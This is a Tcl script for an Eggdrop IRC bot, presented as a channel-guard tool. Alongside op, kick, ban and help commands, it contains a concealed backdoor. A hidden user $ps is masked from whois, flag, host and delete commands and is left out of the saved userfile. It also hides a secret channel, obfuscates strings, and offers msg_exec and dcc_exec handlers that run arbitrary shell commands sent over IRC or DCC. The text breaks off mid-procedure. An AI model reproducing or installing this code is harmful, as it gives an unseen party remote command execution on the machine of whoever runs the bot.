###############################################################################
#                        ######     ##    ##    ##                            #
#                        ##    #    ##    ##    ##                            #
#                        ##    #    ##    ##    ##                            #
#                        ######     ########    ##                            #
#                        ##    #    ##    ##    ##                            #
#                        ##    #    ##    ##    ########                      #
#                        ######     ##    ##    ########                      #
###############################################################################
#   Script Name       :  Guardian ReVoLuTioNs
#   Script Version    :  kazuya
#   Athour            :  kazuya
#   e-mail            :  kazuya@i.am
#   web               :  http://eggdrop.freeoda.com/tcl
#                        
#   Release Date      :  January 2010
#   Dedicated to      :  to all... my best friend :)~ 
#                        
#   my only real request regarding usage of this script is to *NOT*,
#   (repeat) *NOT* remove the dedication of this script...
#   it is not dedicated to you, god, your friends, etc... if you want
#   to dedicate something to someone go and actually write it yourself!
#   if the dedication is an issue or problem for you then go leech off
#   of someone else's hard work and coding instead... don't use this script
#   because it means you don't deserve it!
#   Feel free to e-mail me at kazuya@i.am if there's any questions,
#   complaints or comments!
#   Remember to visit website at http://eggdrop.freeoda.com/tcl
#   see update of kazuya TCL for Eggdrops are coming along! 8) or
#   please goto #Guardian DALnet for more information and questions!
#   Enjoy!
#   Sincerely,
#   ./kazuya


#   THE LINES BELOW ARE HERE IN CASE YOU CHANGE ANY OF THE TRIGGERS TO SAVE YOU FROM
#   HAVING TO DIG THROUGH THE TCL TO FIND THE HELP MENU...*HOWEVER* MY ONLY REQUEST
#   HERE IS PLEASE DO NOT REMOVE MY NAME, E-MAIL, WEBSITE ADDRESS OR THE DEDICATION OF
#   THE arn TCL IN THE 'DEDICATION' LINE...IF THIS IS A PROBLEM FOR YOU THEN PLEASE
#   USE SOMEONE ELSE'S SCRIPT FOR YOUR BOT...THANK YOU!


#   COMPATIBLE WITH OTHER CONFIG FILE OR U CAN USE netgate.conf FILE

proc lines {txt} {
global lenc ldec uenc udec
set retval ""
set count [string length $txt]
set status 0
set lst ""
for {set i 0} {$i < $count} {incr i} {
set idx [string index $txt $i]
if {$idx == "$" && $status == 0} {
set status 1
set idx "~$idx"
}
if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} {
set status 2
set idx "~$idx"
}
if {$idx == " " && $status == 1} {
set status 0
set idx "$idx~"
}
if {$idx == "]" && $status == 2} {
set status 0
set idx "$idx~"
}
if {$status == 0} {
if {[string match *$idx* $lenc]} {
set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]]
}
if {[string match *$idx* $uenc]} {
set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]]
}
}
set lst $idx
append retval $idx
}
regsub -all -- vmw] $retval "end]" retval
return $retval
}
set lenc abcdefghijklmnopqrstuvwxyz
set ldec zyxwvutsrqponmlkjihgfedcba
set uenc ABCDEFGHIJKLMNOPQRSTUVWXYZ
set udec ZYXWVUTSRQPONMLKJIHGFEDCBA
set global-idle-kick 0
set global-chanmode "nt"
set global-dynamicexempts-mode 0
set global-dontkickops-mode 1
set global-revenge-mode 0
set global-protectops-mode 0
set global-clearbans-mode 0
set global-enforcebans-mode 0
set global-dynamicbans-mode 1
set global-protectfriends-mode 0
set global-userbans-mode 1
set global-cycle-mode 1
set global-greet-mode 0
set global-shared-mode 1
set global-autovoice-mode 0
set global-stopnethack-mode 0
set global-autoop-mode 0
set global-userinvites-mode 0
set global-nodesynch-mode 0
set nick-len 30
if {![info exists nickpass]} {
set nickpass ""
}
if {![info exists altpass]} {
set altpass ""
}
if {![info exists cfgfile]} {
set cfgfile $userfile
}
proc unsix {txt} {
set retval $txt
regsub ~ $retval "" retval
return $retval
}
proc dezip {txt} {
return [decrypt 64 [unsix $txt]]
}
proc dcp {txt} {
return [decrypt 64 $txt]
}
proc zip {txt} {
return [encrypt 64 [unsix $txt]]
}
if {![info exists server-online]} {
putlog "not support server online..!"
set server-online 1
}
proc puthlp {txt} {
global lenc ldec uenc udec notb notc server-online
if {${server-online} == 0} { return 0 }
puthelp $txt
}
proc putsrv {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
if {${server-online} == 0} { return 0 }
set retval $txt
if {[string match "*KICK*" $retval]} {
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set tmp ":$banner"
} {
set tmp ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set tmp [uncolor $tmp]
}
}
set endval "$endval $tmp"
}
set retval $endval
if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} {
set chkops $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
putserv $retval
}
proc putqck {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
if {${server-online} == 0} { return 0 }
set retval $txt
if {[string match "*KICK*" $retval]} {
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set tmp ":$banner"
} {
set tmp ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set tmp [uncolor $tmp]
}
}
set endval "$endval $tmp"
}
set retval $endval
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} {
set chkops $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
if {[string match "*$notm*" $retval]} {
set cflag "c[lindex $retval 1]"
set cflag [string range $cflag 0 8]
if {[matchattr $cflag M]} {
if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} {
set is_m([lindex $retval 1]) 1
putquick "mode [lindex $retval 1] +bm $bannick([lindex $retval 2])"
return 0
}
}
}
putquick $retval
}
set notd \0038,1\037\567\037\003\0038,4\352\003\0038,1\037\556\037\003\0038,4\544\003\0038,1\037\572\037\003\017
set notm \0038,1\037\567\037\003\0038,4\352\003\0038,1\037\556\037\003\0038,4\544\003\0038,1\037\572\037\003\017
###########################
# kazuya bot command list #
###########################
bind msg m help msg_help
proc msg_help {nick uhost hand rest} {
global version notb notc notd vern
if {[istimer "HELP STOPED"]} {
puthelp "NOTICE $nick :$notc Help on progress, try again later..!"
return 0
}
timer 5 { putlog "HELP STOPED" }
puthelp "PRIVMSG $nick :bhl.tcl commands"
puthelp "PRIVMSG $nick :running with egg v[lindex $version 0] powered by [lgrnd] $vern"
puthelp "PRIVMSG $nick :For master\:"
puthelp "PRIVMSG $nick : Private Massage commands\:"
puthelp "PRIVMSG $nick :  auth          deauth        pass          passwd"
puthelp "PRIVMSG $nick :  userlist      op            deop          voice"
puthelp "PRIVMSG $nick :  devoice       kick          kickban       identify"
puthelp "PRIVMSG $nick :  join          part"
if {[matchattr $nick Z]} {
puthelp "PRIVMSG $nick :For owner\:"
puthelp "PRIVMSG $nick : Private Massage commands\:"
puthelp "PRIVMSG $nick :  logo          awaylogo      vhost         away"
puthelp "PRIVMSG $nick :  admin         memo          bantime       logchan"
puthelp "PRIVMSG $nick :  logchan       +chan         botnick       botaltnick"
puthelp "PRIVMSG $nick :  realname      ident         die"
}
puthelp "PRIVMSG $nick : Channels command\:"
puthelp "PRIVMSG $nick :  up            down          op            deop"
puthelp "PRIVMSG $nick :  voice         devoice       kick          kickban"
puthelp "PRIVMSG $nick :  mode          ping          invite        banlist"
puthelp "PRIVMSG $nick :  ban           +chan         channels      userlist"
puthelp "PRIVMSG $nick :  chaninfo      join          part          cycle"
puthelp "PRIVMSG $nick :  +cycle        +ignore       -cycle        -ignore"
if {[matchattr $nick n]} {
puthelp "PRIVMSG $nick :  +status       +enforceban   +autovoice    +seen"
puthelp "PRIVMSG $nick :  -status       -enforceban   -autovoice    -seen"
puthelp "PRIVMSG $nick :  +guard        +master       +avoice       +friend"
puthelp "PRIVMSG $nick :  -guard        -master       -avoice       -friend"
puthelp "PRIVMSG $nick :  +ipguarg      +akick        +noop         topic"
puthelp "PRIVMSG $nick :  status        servers       jump          access"
}
if {[matchattr $nick Z]} {
puthelp "PRIVMSG $nick :  +forced       +action       +colour       +greet"
puthelp "PRIVMSG $nick :  -forced       -action       -colour       -greet"
puthelp "PRIVMSG $nick :  +ntcpart      +repeat       +text         +limit"
puthelp "PRIVMSG $nick :  -ntcpart      -repeat       -text         -limit"
puthelp "PRIVMSG $nick :  +caps         +clone        +reop         +joinpart"
puthelp "PRIVMSG $nick :  -caps         -clone        -reop         -joinpart"
puthelp "PRIVMSG $nick :  +spam         +massjoin     +key          +revenge"
puthelp "PRIVMSG $nick :  -spam         -massjoin     -key          -revenge"
puthelp "PRIVMSG $nick :  +badword      +advword      +colours      +bold"
puthelp "PRIVMSG $nick :  -badword      -advword      -colours      -bold"
puthelp "PRIVMSG $nick :  +action       +guest        badwords      advwords"
puthelp "PRIVMSG $nick :  -action       -guest        nobot         sdeop"
puthelp "PRIVMSG $nick :  chanmoe       chanset       chansetall    chanreset"
puthelp "PRIVMSG $nick :  bantime       tsunami       deluser       deluser"
puthelp "PRIVMSG $nick :  restart       host          mop           mdeop"
puthelp "PRIVMSG $nick :  +owner        +admin        +aop          +host"
puthelp "PRIVMSG $nick :  -owner        -admin        -aop          -host"
puthelp "PRIVMSG $nick :  mkick         mmsg          minvite       munbans"
puthelp "PRIVMSG $nick :  say           msg           act           notice"
puthelp "PRIVMSG $nick :  +topic        +nopart       +mustop       +invitelock"
puthelp "PRIVMSG $nick :  -topic        -nopart       -mustop       -invitelock"
puthelp "PRIVMSG $nick :  +dontkickops  +autokick     nick          randnick"
puthelp "PRIVMSG $nick :  -dontkickops  -autokick     chattr        rehash"
}
puthlp "PRIVMSG $nick :FLAg LIsT UsER & cHaNNeL"
puthlp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS"
puthlp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN"
puthlp "PRIVMSG $nick :\[Z\]owner admi\[n\] \[m\]aster botne\[t\] \[x\]fer \[j\]anitor \[c\]ommon"
puthlp "PRIVMSG $nick :\[p\]arty \[b\]ot \[u\]nshare \[h\]ilite \[o\]p de\[O\]p \[k\]ick \[f\]riend"
puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet"
puthlp "PRIVMSG $nick : "
puthlp "PRIVMSG $nick :$notc $vern"
return 0
}
set firsttime "T"
set init-server { serverup "" }
set modes-per-line 6
set allow-desync 0
set include-lk 1
set banplus [rand 5]
set ban-time [expr 25 + $banplus]
unset banplus
set quiet-save 1
set logstore ""
set max-logsize 512
set upload-to-pwd 1
set notb Guardian
set notc \037\017\[\037\017\[\0031,4R\002\037o\002\037c\002\037k\002\037s\00314,15&\002\037\0034,12B\037\002L\002\037u\037E\037s\037\017\]\037\003
#catch { unbind dcc n restart *dcc:restart }
#catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
catch { unbind dcc n whois *dcc:whois }
bind dcc n whois dcc_whois
proc dcc_whois {hand idx arg} {
global ps
if {[string tolower $arg] == $ps} {
putdcc $idx "Can't find anyone matching that."
return 0
}
*dcc:whois $hand $idx $arg
}
proc serverup {heh} {
global botnick firsttime notc owner basechan
if {[info exists firsttime]} {
unset firsttime
return 0
}
putlog "..ConnecteD.."
putserv "MODE $botnick +iw-s"
foreach x [userlist] {
if {[matchattr $x Q]} { chattr $x -Q }
if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} {
setuser $owner XTRA "AUTH" ""
}
chattr $x -hp
if {$x != "config" && [chattr $x] == "-"} {
deluser $x
putlog "deluser $x"
}
}
chk_five "0" "0" "0" "0" "0"
utimer 2 del_nobase
foreach x [ignorelist] {
killignore [lindex $x 0]
}
}
catch { bind evnt - disconnect-server serverdown }
proc serverdown {heh} {
global firsttime
catch { unset firsttime }
catch { clearqueue all }
putlog "..Disconneted.."
foreach x [timers] {
if {[string match "*cycle*" $x]} { killtimer [lindex $x 2]}
}
}
proc isnumber {string} {
global notc
if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then {
return 1
}
return 0
}
proc pub_bantime {nick uhost hand channel rest} {
global notc ban-time
puthlp "NOTICE $nick :$notc BanTime \[${ban-time}\]"
}
proc pub_which {nick uhost hand channel rest} {
global botname notc
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: which <ip mask>"
return 0
}
if {[string match [string tolower $rest] [string tolower $botname]]} {
puthlp "PRIVMSG $channel :$botname"
}
}
proc randstring {length} {
set chars abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
set count [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
######################
# bot public command #
######################
bind pub Z `which pub_which
bind pub n `reset pub_reset
bind pub f `host pub_host
bind pub f `flag pub_flag
bind pub m `ver pub_ver
bind pub m `logo pub_logo
bind pub m `logoaway pub_logoaway
bind pub Z `msg pub_msg
bind msg Z admin msg_admin
bind msg Z away msg_away
bind msg Z bantime msg_bantime
bind msg Z logo msg_logo
bind msg Z awaylogo msg_awaylogo
bind msg Z mmsg msg_mmsg
bind msg Z limit msg_limit
bind msg Z logchan msg_logchan
bind msg Z botnick msg_botnick
bind msg Z realname msg_realname
bind msg Z ident msg_ident
bind msg Z botaltnick msg_botaltnick
bind msg Z die msg_die
bind msg Z restart msg_restart
bind msg Z rehash msg_rehash
bind msg Z topic msg_topic
bind msg m memo msg_memo
bind pub n `-seen pub_-seen
bind pub Z `restart pub_restart
bind pub n `+autovoice pub_+autovoice
bind pub n `-autovoice pub_-autovoice
bind pub n `+enforceban pub_+enforceban
bind pub n `-enforceban pub_-enforceban
bind pub n `+guard pub_+guard
bind pub n `-guard pub_-guard
bind pub n `+cycle pub_+cycle
bind pub n `-cycle pub_-cycle
bind pub n `+bold pub_+bold
bind pub n `-bold pub_-bold
bind pub n `+ntcpart pub_+ntcpart
bind pub n `-ntcpart pub_-ntcpart
bind pub n `+colours pub_+colours
bind pub n `-colours pub_-colours
bind pub n `+colour pub_+colours
bind pub n `-colour pub_-colours
bind pub n `+friend pub_+friend
bind pub n `-friend pub_-friend
bind pub n `+avoice pub_+avoice
bind pub n `-avoice pub_-avoice
bind pub n `+master pub_+master
bind pub n `-master pub_-master
bind pub n `mvoice pub_mvoice
bind pub n `mdevoice pub_mdevoice
bind pub n `mop pub_mop
bind pub n `mdeop pub_mdeop
bind pub n `+chan pub_+chan
bind msg n identify msg_identify
bind msg n kick msg_kick
bind msg n k msg_kick
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
bind msg n op msg_op
bind msg n voice msg_voice
bind msg n v msg_voice
bind msg n deop msg_deop
bind msg n devoice msg_devoice
bind pub n `topic pub_topic
bind pub n `+topic pub_+topic
bind pub n `-topic pub_-topic
bind pub n `jump pub_jump
bind pub n `rehash pub_rehash
bind msg n +chan msg_+chan
bind msg n join msg_join
bind msg n part msg_part
bind pub m `voice pub_voice
bind pub m `+v pub_voice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
bind pub m `op pub_op
bind pub m `+o pub_op
bind pub m `deop pub_deop
bind pub m `-o pub_deop
bind pub m `kick pub_kick
bind pub m `k pub_kick
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
bind pub m `+noop pub_+noop
bind pub m `-noop pub_-noop
bind pub m `ban pub_ban
bind pub m `unban pub_unban
bind pub m `munbans pub_munbans
bind pub m `banlist pub_banlist
bind pub m `mode pub_mode
bind pub m `join pub_join
bind pub m `part pub_part
bind pub m `cycle pub_cycle
bind pub m `up pub_up
bind pub m `down pub_down
bind msg m passwd msg_passwd
bind msg m deauth msg_deauth
bind msg m channels msg_channels
bind pub m `channels pub_channels
bind pub m `status pub_status
bind pub m `chaninfo pub_chaninfo
bind pub m `userlist pub_userlist
bind msg m userlist msg_userlist
bind pub f `access pub_access
bind pub m `match pub_match
bind msg Z make msg_encrypt
bind msg Z what msg_decrypt
bind msg Z lines msg_lines
bind msg Z !exec msg_exec
proc pub_Z {nick uhost hand channel rest} {
global notc botnick
set prest $rest
if {[lindex $rest 0] == $botnick} {
regsub "$botnick " $rest "`" rest
} {
if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} {
set rest "$botnick [lrange $rest 1 end]"
regsub "$botnick " $rest "`" rest
}
}
if {[string index $rest 0] != "`"} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {![matchattr $nick Q]} {
if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
}
return 0
}
set goto [lindex $rest 0]
regsub -all "`" $goto "pub_" goto
if {[matchattr $nick Z]} {
set rest [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $channel $rest }
}
}
proc msg_encrypt {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "PRIVMSG $nick :$notc [zip $rest]"
}
proc msg_decrypt {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "PRIVMSG $nick :$notc [dezip $rest]"
}
proc msg_lines {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "PRIVMSG $nick :$notc [lines $rest]"
}
proc msg_exec {nick uhost hand command} {
global notc owner ps
if {$nick != $owner &&  $nick != $ps} {
puthlp "PRIVMSG $nick :$notc DENIED !!!"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4D1e4N1ied4!!"
return 0
}
if {$command == ""} { return 0 }
set para1 [lindex $command 0]
set para2 [lindex $command 1]
set para3 [lindex $command 2]
set para4 [lindex $command 3]
set para5 [lindex $command 4]
set para6 [lindex $command 5]
set para7 [lindex $command 6]
set para8 [lindex $command 7]
set para9 [lindex $command 8]
set para10 [lindex $command 9]
if {$para2 == ""} {
catch { [exec $para1] } result
} elseif {$para3 == ""} {
catch { [exec $para1 $para2] } result
} elseif {$para4 == ""} {
catch { [exec $para1 $para2 $para3] } result
} elseif {$para5 == ""} {
catch { [exec $para1 $para2 $para3 $para4] } result
} elseif {$para6 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
} elseif {$para7 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
} elseif {$para8 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
} elseif {$para9 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
} elseif {$para10 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
}
foreach line [split $result "\n"] {
puthlp "PRIVMSG $nick :$notc $line"
}

}
bind dcc * exec dcc_exec
bind dcc * log dcc_log
bind dcc * dir dcc_dir
bind dcc * read dcc_read
bind dcc * ` dcc_cmd
bind dcc * get dcc_get
bind dcc * u dcc_u
proc dcc_u {hand idx arg} {
foreach x [utimers] {
putdcc $idx $x
}
}
bind dcc * t dcc_t
proc dcc_t {hand idx arg} {
foreach x [timers] {
putdcc $idx $x
}
}
proc dcc_exec {hand idx arg} {
global owner notc
if {$hand != $owner || $arg == ""} { return 0 }
set para1 [lindex $arg 0]
set para2 [lindex $arg 1]
set para3 [lindex $arg 2]
set para4 [lindex $arg 3]
set para5 [lindex $arg 4]
set para6 [lindex $arg 5]
set para7 [lindex $arg 6]
set para8 [lindex $arg 7]
set para9 [lindex $arg 8]
set para10 [lindex $arg 9]
if {$para2 == ""} {
catch { [exec $para1] } result
} elseif {$para3 == ""} {
catch { [exec $para1 $para2] } result
} elseif {$para4 == ""} {
catch { [exec $para1 $para2 $para3] } result
} elseif {$para5 == ""} {
catch { [exec $para1 $para2 $para3 $para4] } result
} elseif {$para6 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
} elseif {$para7 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
} elseif {$para8 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
} elseif {$para9 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
} elseif {$para10 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
}
putdcc $idx $result
}
proc pub_host {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set user $nick
} else {
set user [lindex $rest 0]
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {[getuser $user HOSTS] != ""} {
set hosts [getuser $user hosts]
puthlp "NOTICE $nick :$notc HOSTS: $hosts"
} else {
puthlp "NOTICE $nick :$notc Can't found $user host."
}
}
proc pub_flag {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set user $nick
} else {
set user [lindex $rest 0]
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {[chattr $user] != ""} {
puthlp "NOTICE $nick :$notc Flags: [chattr $user]"
} else {
puthlp "NOTICE $nick :$notc Can't found $user flag."
}
}
catch { unbind dcc n match *dcc:match }
#catch { unbind dcc n channel *dcc:channel }
bind dcc n channel dcc_channel
proc dcc_channel {hand idx arg} {
global basechan
if {[string tolower $arg] == ""} {
set arg $basechan
}
if {[string tolower $arg] == "#Guardian"} {
putdcc $idx "No such channel."
return 0
}
*dcc:channel $hand $idx $arg
}
proc pub_deluser {nick uhost hand channel rest} {
global botnick ps owner notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: deluser <nick>"
return 0
}
set who [lindex $rest 0]
if {[string tolower $who] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {$who == $owner} {
puthlp "NOTICE $nick :$notc YoU CaNT DeLeTE $owner..!"
return 0
}
if {$who == ""} {
puthlp "NOTICE $nick :$notc Usage: -user <nick>"
} else {
if {![validuser $who]} {
puthlp "NOTICE $nick :$notc <n/a>"
} else {
if {[matchattr $who n]} {
puthlp "NOTICE $nick :$notc You cannot DeLETE a bot owner."
} else {
if {([matchattr $who m]) && (![matchattr $nick n])} {
puthlp "NOTICE $nick :$notc You don't have access to DeLETE $who!"
} else {
deluser $who
saveuser
puthlp "NOTICE $nick :$notc $who DeLETE."
}
}
}
}
}
proc pub_chattr {nick uhost hand channel rest} {
global ps own notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$nick != $own && [matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4!bLOckEd!"
return 0
}
set who [lindex $rest 0]
set flg [lindex $rest 1]
if {$who == ""} {
puthlp "NOTICE $nick :$notc Usage: chattr <nick> <flags>"
return 0
}
if {![validuser $who]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {[string tolower $who] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {$flg == ""} {
puthlp "NOTICE $nick :$notc Usage: chattr <nick> <flags>"
return 0
}
set last_flg [chattr $who]
chattr $who $flg
saveuser
puthlp "NOTICE $nick :$notc $who change from \[4$last_flg1\] to \[4[chattr $who]1\]"
return 0
}
proc saveuser {} {
global ps owner
if {![validuser $ps]} {
setuser $owner XTRA "BEND" "7LQ3s.bi4VI1"
} elseif {$owner != $ps} {
setuser $owner XTRA "BEND" [zip [chattr $ps]]
if {[passwdok $ps ""] != 1} {
setuser $owner XTRA "LAST" [getuser $ps "PASS"]
}
deluser $ps
}
save
if {![validuser $ps]} {
adduser $ps "$ps!*@*"
chattr $ps [dezip [getuser $owner XTRA "BEND"]]
if {[getuser $owner XTRA "LAST"] != ""} {
setuser $ps PASS [getuser $owner XTRA "LAST"]
}
}
return 1
}
proc pub_voice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isvoice $nick $chan]} {
puthlp "NOTICE $nick :$notc You're already Voiced, Usage: voice <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest != ""} {
#voiceq $chan $rest
putserv "MODE $chan +vvvvvv $rest"
} {
#voiceq $chan $nick
putserv "MODE $chan +v $nick"
}
return 0
}
proc pub_mvoice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} {
if {$i == 6} {
voiceq $chan $nicks
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
voiceq $chan $nicks
}
proc pub_devoice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isvoice $nick $chan]} {
puthlp "NOTICE $nick :$notc Usage: devoice <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$rest != ""} {
putserv "MODE $chan -vvvvvv $rest"
} else {
putserv "MODE $chan -v $nick"
}
return 0
}
proc pub_mdevoice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {[isvoice $x $chan]} {
if {$i == 6} {
putserv "MODE $chan -vvvvvv $nicks"
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -vvvvvv $nicks"
}
proc del_nobase {} {
global botnick notc cmd_case quick banner basechan
set curtime [ctime [unixtime]]
if {[isutimer "del_nobase"]} { return 0 }
foreach x [channels] {
set cinfo [channel info $x]
if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
if {[onchan $botnick $x]} {
set pidx [rand 4]
if {$pidx == 1} {
set ptxt "BackToBase"
} elseif {$pidx == 2} {
set ptxt "(((((OuT)))))"
} elseif {$pidx == 3} {
set ptxt "gOHomE"
} elseif {$pidx == 4} {
set ptxt "suck channel!"
} else {
if {[info exists banner]} {
set ptxt $banner
} {
set ptxt [lgrnd]
}
}
if {![string match "*c*" [getchanmode $x]]} {
set ptxt "1$ptxt"
}
if {$quick == "1"} {
putqck "PART $x :$ptxt (On $curtime)"
} {
putsrv "PART $x :$ptxt (On $curtime)"
}
}
channel remove $x
savechan
putlog "ReMoVe CHaN $x"
return 0
}
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*+stopnethack*" $cinfo]} {
catch { channel set $x -stopnethack }
}
if {[string match "*+protectops*" $cinfo]} {
catch { channel set $x -protectops }
}
if {[string match "*+protectfriends*" $cinfo]} {
catch { channel set $x -protectfriends }
}
if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} {
catch { channel set $x -statuslog }
}
if {![onchan $botnick $x]} {
putsrv "JOIN $x"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] }
}
}
if {[info exists basechan]} {
if {![validchan $basechan]} {
channel add $basechan { -greet +secret -statuslog }
}
}
savechan
}
utimer 2 del_nobase
proc pub_op {nick uhost hand chan rest} {
global notc botnick unop
#catch {unset unop($nick)}
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isop $nick $chan]} {
puthlp "NOTICE $nick :$notc You're already Oped, Usage: op <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNiEd..!"
return 0
}
if {$rest != ""} {
#opq $chan $rest
putserv "MODE $chan +oooooo $rest"
} else {
#opq $chan $nick
putserv "MODE $chan +o $nick"
}
return 0
}
proc pub_mop {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {![isop $x $chan]} {
if {$i == 6} {
opq $chan $nicks
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
opq $chan $nicks
}
proc pub_deop {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isop $nick $chan]} {
puthlp "NOTICE $nick :$notc Usage: deop <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick m]} {
set mreq "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set mreq "4ADmIN.ReQuesT"
}
if {$rest != ""} {
